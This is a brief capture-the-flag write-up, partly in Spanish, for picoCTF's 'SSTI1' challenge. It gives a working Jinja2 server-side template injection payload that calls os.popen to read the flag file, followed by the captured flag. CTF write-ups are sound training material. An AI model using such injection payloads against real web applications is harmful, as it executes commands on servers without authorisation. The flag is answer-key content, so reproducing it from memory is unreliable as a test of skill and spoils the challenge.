
# Reto 
### SSTI1
## Descripcion
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:62531/)!
## Solucion
```
uso de {{ lipsum.__globals__.os.popen('cat flag').read() }}
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
```


